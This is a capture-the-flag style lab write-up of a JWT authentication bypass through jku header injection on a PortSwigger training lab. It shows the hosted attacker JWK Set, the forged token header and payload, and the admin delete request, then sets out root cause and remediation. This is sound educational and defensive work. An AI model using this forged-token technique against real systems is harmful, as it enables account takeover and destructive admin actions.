# JWT authentication bypass via jku header injection

**Category:** Broken Authentication (JWT)  
**Difficulty:** ⭐⭐ (Practitioner)  
**Severity:** 🔴 Critical  
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures

---

## Description

This lab's authentication uses JWTs signed with RS256 (RSA). The server supports a `jku` (JWK Set URL) header parameter, which tells it where to fetch the public key set used for signature verification — but it does not restrict that URL to a trusted host. By hosting our own JWK Set on the exploit server and pointing `jku` at it, we make the server verify the token against an attacker-controlled public key. We sign a forged token with our matching private key, impersonate `administrator`, and reach the admin panel.

---

## Discovery Process

**Step 1 — Login with the provided credentials**

Logged in with `wiener:peter`, which issues a valid session JWT used for authenticated requests.

> 📸 `screenshots/01-login.png`

**Step 2 — Confirm the admin area is restricted**

Sent `GET /admin` with the `wiener` token. The server returned `HTTP/2 401 Unauthorized`, confirming access is gated by the `sub` claim.

> 📸 `screenshots/02-admin-401.png`

---

## Exploitation

**Step 3 — Generate an RSA key and host the JWK Set on the exploit server**

In Burp's JWT Editor (Keys tab), generated a new RSA key (2048-bit, JWK format). Copied the public key as a JWK and hosted it as a JWK Set on the exploit server, so it is reachable at a URL like:

```text
https://exploit-0a4f00dd048ab9e4839abd69012d0043.exploit-server.net/exploit
```

The hosted body is a JWK Set containing the public key:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "667717f5-2193-4d7c-a0da-8283391f6616",
      "n": "jia-rRZDRHPzZDphObdf9JdIRaBzyKPFbixgnpxAbuB3d2j0_lucOjwcfp..."
    }
  ]
}
```

> 📸 `screenshots/03-exploit-server-jwk.png`

**Step 4 — Forge the token with the jku header and sign with the generated RSA key**

In Repeater (JSON Web Token tab) modified the token:

- Header: kept `"alg": "RS256"`, set `"kid"` to match the generated key's ID, and added a `"jku"` parameter pointing to the hosted JWK Set on the exploit server.
- Payload: changed `"sub"` to `"administrator"`.

Then clicked **Sign** and selected the RSA key that was generated in Step 3, signing the token with the corresponding private key. Because the server fetches the public key from the attacker-controlled `jku` URL, the signature verifies successfully.

The forged header and payload:

```json
{
  "kid": "667717f5-2193-4d7c-a0da-8283391f6616",
  "alg": "RS256",
  "jku": "https://exploit-0a4f00dd048ab9e4839abd69012d0043.exploit-server.net/exploit"
}
```

```json
{
  "iss": "portswigger",
  "exp": 1782510047,
  "sub": "administrator"
}
```

Sending this token to `/admin` returned `HTTP/2 200 OK` with the admin interface.

> 📸 `screenshots/04-jku-admin-200.png`

**Step 5 — Delete carlos and solve the lab**

Requested `/admin/delete?username=carlos` with the forged token.

**Request sent:**

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0aa800a404a7b99e8338be9d00ca00ab.web-security-academy.net
Cookie: session=eyJraWQiOiI2Njc3MTdmNS0yMTkzLTRkN2MtYTBkYS04Mjgz...
```

**Response received:**

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The user `carlos` was deleted and the lab was marked **Solved**.

> 📸 `screenshots/05-delete-carlos-302.png`  
> 📸 `screenshots/06-solved.png`

---

## Impact

- **Full authentication bypass** — The server fetches the verification key from an attacker-controlled URL, so any token the attacker signs is accepted as valid.
- **Privilege escalation to administrator** — A low-privilege user (`wiener`) forges an `administrator` token and reaches restricted functionality.
- **Destructive admin actions** — Admin access enables deleting users (`carlos`) and any other privileged operation, leading to data loss and full application compromise.

---

## Root Cause

The `jku` header is meant to point to a trusted JWK Set so the server can locate the correct public key. Here the server fetches the key set from whatever URL the token supplies, without validating it against an allowlist of trusted hosts. This lets the attacker host their own key pair, point `jku` at it, and have the server verify forged tokens against the attacker's public key.

**Vulnerable flow:**

```
attacker hosts own JWK Set + sets jku to exploit server → server fetches public key from attacker URL → verifies signature against attacker key → ❌ no host allowlist → token accepted as administrator
```

**Secure flow:**

```
attacker sets jku to exploit server → server only fetches keys from a pre-approved trusted domain → attacker URL rejected → ✅ signature cannot be verified with a trusted key → token rejected
```

---

## Remediation

- **Allowlist the jku host** — Only fetch JWK Sets from a hardcoded, trusted domain under the application's control; reject any other `jku` value.
- **Prefer static, pinned keys** — Where possible, configure verification keys server-side rather than fetching them dynamically from a URL in the token.
- **Enforce the expected algorithm** — Pin `RS256` and reject `none` and unexpected algorithms to prevent related JWT bypasses.
- **Validate all standard claims** — Verify `iss`, `exp`, and `sub` server-side using a hardened JWT library that does not blindly trust header-supplied key locations.

---

## Tools Used

- Burp Suite (Proxy & Repeater)
- JWT Editor Extension (RSA key generation, Sign with RSA key)
- Exploit Server (hosting the malicious JWK Set)

---

## References

- <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection>
- <https://portswigger.net/web-security/jwt>
- RFC 7515 – JSON Web Signature (JWS)
- RFC 7517 – JSON Web Key (JWK)
- <https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/>
